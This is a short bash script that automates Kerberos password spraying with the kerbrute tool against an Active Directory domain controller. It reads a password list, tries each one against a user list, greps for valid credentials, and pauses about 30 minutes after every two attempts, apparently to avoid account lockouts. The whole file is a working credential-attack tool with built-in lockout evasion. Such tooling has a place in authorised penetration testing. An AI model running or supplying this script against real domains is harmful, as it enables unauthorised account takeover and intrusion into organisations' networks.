# 2 attempts every 30 minues
#!/bin/bash
# Kerbrute Timer
NC='\033[0m' # No Color
GREEN='\033[0;32m'

# Initialize attempt counter
attempt_counter=0

while read passwords; do
    ((attempt_counter++))
    
    ./kerbrute_linux_amd64 passwordspray --dc DC_IP -d FULL_DOMAIN_NAME users.txt "${passwords}" >> kerbrute_results
    cat kerbrute_results | grep VALID
    printf "${GREEN}Completed Password Spray with password : ${passwords} ${NC}\n"
    echo "Time Now: $(date +%H:%M:%S)"
    
    # Check if two attempts are done
    if [ $attempt_counter -eq 2 ]; then
        echo "Two attempts done. Sleeping for 1810 seconds (+30 minutes) before next round."
        attempt_counter=0  # Reset the attempt counter
        sleep 1810
    fi
done < passwords
